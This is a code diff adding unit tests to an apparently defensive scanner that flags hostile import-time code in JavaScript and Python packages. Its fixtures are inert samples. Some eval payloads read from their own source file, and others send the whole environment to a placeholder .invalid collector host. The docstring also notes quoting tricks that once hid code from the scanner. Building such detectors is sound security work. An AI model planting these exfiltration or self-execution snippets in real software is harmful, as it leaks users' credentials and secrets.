@@ -561,6 +561,57 @@ class SelfReadTests(unittest.TestCase):
                 self.assertEqual(core.runs_own_source_at(text), -1)
 
 
+class ReadByTheLexersTests(unittest.TestCase):
+    """What the import-time test's self-read takes for code in a JavaScript or
+    Python file is what the language's lexers read as code (docs/RUST_ENGINE.md
+    §15): a quote or a backtick in a comment or a regular expression begins
+    no literal, and a template's holes are code. Paired as they came, those
+    quotes hid the rest of a line, or of the file, from it (evasions the
+    engine had until phase 2). The data flow and the dead drop still pair
+    quotes as they come: read by the lexers, the names they follow without
+    scopes met in minified bundles the quotes had hidden (playwright's), so
+    they move to the lexers with scopes (phase 3; the two expected failures
+    below). Without a language (an install script, a hook's command) quotes
+    are paired as they come. All inert: the hosts are .invalid."""
+    OWN = SelfReadTests.OWN
+    ENV = "reads credentials or the whole environment and sends data over the network"
+
+    def test_a_backtick_in_a_comment_begins_no_template(self):
+        src = ("// note: the ` character marks a template\n"
+               "const fs = require('fs');\n"
+               "const code = fs.readFileSync(__filename, 'utf8').split('//' + 'PAYLOAD')[1];\n"
+               "eval(code);\n")
+        self.assertEqual(core.import_time_risk(src, "js"), ([self.OWN], 4))
+
+    def test_a_templates_hole_is_code(self):
+        src = ("const fs = require('fs');\n"
+               "const out = `${eval(fs.readFileSync(__filename, 'utf8').split('/*' + 'P*/')[1])}`;\n")
+        self.assertEqual(core.import_time_risk(src, "js"), ([self.OWN], 2))
+
+    @unittest.expectedFailure      # (the data flow on the lexers waits for scopes: phase 3)
+    def test_a_quote_in_a_regular_expression_begins_no_string(self):
+        src = ("const q = /'/g; fetch('https://collector.invalid/x', {method: 'POST', "
+               "body: JSON.stringify(process.env)});\n")
+        self.assertEqual(core.import_time_risk(src, "js"), ([self.ENV], 1))
+
+    @unittest.expectedFailure      # (the data flow on the lexers waits for scopes: phase 3)
+    def test_triple_quotes_in_a_python_comment_begin_no_string(self):
+        src = ('# the """ quotes\n'
+               "import os, urllib.request\n"
+               "urllib.request.urlopen('https://collector.invalid/x', data=str(dict(os.environ)).encode())\n"
+               '# end """\n')
+        self.assertEqual(core.import_time_risk(src, "py"), ([self.ENV], 3))
+
+    def test_prose_is_still_prose(self):
+        # what the lexers read as a literal or a comment is no code
+        for lang, src in (("js", "// fs.readFileSync(__filename) then eval it\nconst x = 1;\n"),
+                          ("js", "const s = `eval(fs.readFileSync(__filename))`;\n"),
+                          ("py", "# exec(open(__file__).read())\nx = 1\n"),
+                          ("py", "s = 'exec(open(__file__).read())'\n")):
+            with self.subTest(src=src):
+                self.assertEqual(core.import_time_risk(src, lang), ([], None))
+
+
 class DecoderAliasTests(unittest.TestCase):
     def found(self, text):
         return [(i["rule"], i["line"]) for i in core.scan_file("site-packages/x/a.py", text, "py", dep=True)
